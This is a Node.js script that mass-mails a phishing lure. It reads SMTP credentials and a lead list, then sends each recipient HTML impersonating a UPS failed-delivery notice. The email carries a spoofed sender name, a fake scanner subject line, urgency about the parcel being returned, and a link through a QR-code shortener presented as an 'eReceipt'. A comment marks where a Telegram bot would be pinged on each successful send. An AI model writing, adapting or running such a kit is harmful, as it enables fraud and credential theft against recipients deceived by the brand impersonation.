const fs = require('fs');
const csv = require('csv-parser');
const nodemailer = require('nodemailer');
const axios = require('axios');

// Read SMTP details from smtp.txt
const smtpDetailsRaw = fs.readFileSync('smtp.txt', 'utf-8').split('\n');
const smtpDetails = {};
smtpDetailsRaw.forEach(line => {
    const [key, value] = line.split('=');
    smtpDetails[key.trim()] = value.trim();
});

const smtpConfig = {
    host: smtpDetails['SMTP_SERVER'],
    port: parseInt(smtpDetails['SMTP_PORT'], 10),
    secure: smtpDetails['USE_TLS'] === 'true',
    auth: {
        user: smtpDetails['SMTP_USER'],
        pass: smtpDetails['SMTP_PASSWORD']
    }
};

// Read leads from eleads.csv and send emails
fs.createReadStream('eleads.csv')
    .pipe(csv())
    .on('data', (row) => {
        const recipient = row.email;

        // Create a Nodemailer transporter
        const transporter = nodemailer.createTransport(smtpConfig);

        // Send email
        transporter.sendMail({
            from: '"Document Center" <lalla41@telus.net>',
            to: recipient,
            subject: 'Document from HP LaserJet Pro Scanner',
            html: `
                <body>
<div 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div class=wide-content-host 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div tabIndex=-1 class=uy30y 
style="BORDER-TOP: 0px solid; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-LEFT-COLOR: ; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; BORDER-BOTTOM-COLOR: ; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 2px 8px; BORDER-RIGHT-COLOR: ; PADDING-RIGHT: 0px; border-image-source: ; border-image-slice: ; border-image-width: ; border-image-outset: ; border-image-repeat: ; border-radius: 4px">
<div class=mT25S 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; WIDTH: 529px; VERTICAL-ALIGN: baseline; TABLE-LAYOUT: fixed; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; DISPLAY: table; PADDING-RIGHT: 0px">
<div class=wnVEW 
style="FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: 400; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px 0px 0px 44px; PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit">
<div class=w4BZ9 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div role=document tabIndex=-1 aria-label="Message body" 
class="T31hC GNqVo allowTextSelection OuGoX" 
style="CURSOR: auto; BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; OVERFLOW-Y: auto; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 16px; BORDER-LEFT: 1px solid; MARGIN: 0px; OUTLINE-COLOR: invert; PADDING-RIGHT: 16px; border-image: initial; user-select: text; will-change: scroll-position">
<div 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div id=x_ydpf7aa84dyahoo_quoted_1901541405 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div 
style="FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: 'Helvetica Neue', Helvetica, Arial, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(38,40,42) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit">
<div 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<div id=x_ydpf7aa84dyiv2321113204 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"><font 
size=3 face=Arial>
<h3 
style="FONT-SIZE: 48px; FONT-FAMILY: Arial; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(59,96,130) !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 12px 0px 8px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; text-decoration-style: initial; text-decoration-color: initial"><img 
style="MAX-WIDTH: 572px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" 
src="https://www.aiche.org/sites/default/files/images/page/lead/upsdiscounts.jpg" 
width=70 height=47 data-inlineimagemanipulating="true" 
data-imagetype="External"></h3>
<h3 
style="FONT-SIZE: 48px; FONT-FAMILY: Arial; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(59,96,130) !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 12px 0px 8px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; text-decoration-style: initial; text-decoration-color: initial"><span 
style="FONT-SIZE: xx-large; BORDER-TOP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit">Greetings 
${row.name},</span></h3>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">
<h3 
style="FONT-SIZE: 48px; FONT-WEIGHT: normal; COLOR: rgb(59,96,130) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 12px 0px 8px; PADDING-RIGHT: 0px"><span 
style="FONT-SIZE: xx-large; BORDER-TOP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit">Package 
delivery attempt failed. </span></h3>
<h3 
style="FONT-SIZE: 48px; FONT-WEIGHT: normal; COLOR: rgb(59,96,130) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 12px 0px 8px; PADDING-RIGHT: 0px"><span 
style="FONT-SIZE: xx-large; BORDER-TOP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit">Notice 
on July 19th, 2024, 10:30 AM.</span></h3></div>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">The 
delivery attempt was unsuccessful because no one was present at the delivery 
address, so this notice has been automatically sent.</div>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">&nbsp;</div>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">You 
can arrange re-delivery by contacting us with your postage reference number on 
the attached<span 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;</span><strong><a 
href="https://qrco.de/bfFUwI">eReceipt HERE</a>.</strong></div>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">&nbsp;</div>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">In 
any case the parcel is<span 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;</span><strong>NOT 
scheduled for re-delivery in 7 days</strong>, it&nbsp;will be returned to the 
sender.</div>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">&nbsp;</div>
<div 
style="BORDER-TOP: 0px; FONT-FAMILY: Arial; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: black !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: white; TEXT-INDENT: 0px; font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; text-decoration-style: initial; text-decoration-color: initial">
<div 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">Thank 
You.</div>
<div 
style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">UPS 
Choice</div></div></font></div></div></div></div></div></div></div></div></div>
<p><span aria-haspopup=dialog role=button tabIndex=0 
aria-label="Opens card for Linda Mitchell" 
class="undefined lpcCommonWeb-hoverTarget container-474" 
style="CURSOR: pointer; BORDER-TOP: 0px; BORDER-RIGHT: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; FONT-WEIGHT: normal; COLOR: ; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" 
data-is-focusable="true" data-lpc-hover-target-id="lpc-react-target-13"><span 
role=img aria-label="Linda Mitchell" id=avatar-r1b 
class="fui-Avatar r81b29z ___12gjebn feqmc2u fbhnoac" 
style="BORDER-TOP: 0px; HEIGHT: 40px; FONT-FAMILY: var(--fontFamilyBase); BORDER-RIGHT: 0px; WIDTH: 40px; VERTICAL-ALIGN: middle; BORDER-BOTTOM: 0px; POSITION: relative; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; DISPLAY: inline-block; PADDING-RIGHT: 0px; border-radius: var(--borderRadiusCircular); font-stretch: inherit; font-optical-sizing: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; flex-shrink: 0"></span></span></p></div></div></div></div></div>
</body>
            `
        }, (error, info) => {
            if (error) {
                console.log(`Failed to send email to ${recipient}: ${error}`);
            } else {
                console.log(`Email sent to ${recipient}: ${info.response}`);
                // Ping Telegram bot over webhook URL
            }
        });
    })
    .on('end', () => {
        console.log('Email sending completed');
    });
